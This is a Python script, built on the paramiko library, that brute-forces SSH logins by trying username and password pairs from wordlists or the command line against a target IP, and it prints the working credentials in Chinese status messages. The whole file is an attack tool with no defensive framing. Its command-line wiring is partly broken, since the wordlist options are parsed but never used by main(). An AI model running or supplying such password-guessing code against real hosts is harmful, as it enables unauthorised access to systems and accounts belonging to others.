import argparse

import paramiko


def ssh_file_brute(host_ip, username_file, passwd_file):
    found = False
    try:
        with open(username_file, 'r') as uf:
            usernames = uf.read().splitlines()
        with open(passwd_file, 'r') as pf:
            passwords = pf.read().splitlines()
        for username in usernames:
            for password in passwords:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host_ip, username=username, password=password, timeout=5)
                    print(f"[+] 登录成功: {username}:{password}")
                    found = True
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"[-] 认证失败: {username}:{password}")
                except Exception as e:
                    print(f"[!] 连接错误: {e}")
                finally:
                    ssh.close()
    except FileNotFoundError as e:
        print(f"[!] 文件未找到: {e}")
    if not found:
        print("未找到正确的用户名和密码。")
def ssh_brute(host_ip, username, passwd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host_ip, username=username, password=passwd, timeout=5)
        print(f"[+] 登录成功: {username}:{passwd}")
    except paramiko.AuthenticationException:
        print(f"[-] 认证失败: {username}:{passwd}")
    except Exception as e:
        print(f"[!] 连接错误: {e}")
    finally:
        ssh.close()

def main():
    parse = argparse.ArgumentParser(description="SSH Brute Force")
    parse.add_argument("-i", "--host_ip", help="Target IP")
    parse.add_argument("-u", "--username_file", help="Username file")
    parse.add_argument("-p", "--passwd_file", help="Password file")
    parse.add_argument("-U", "--username", help="Username")
    parse.add_argument("-P", "--passwd", help="Password")
    args = parse.parse_args()
    if args.host_ip and args.username and args.passwd:
        ssh_brute(args.host_ip, args.username, args.passwd)
        return
if __name__ == '__main__':
     main()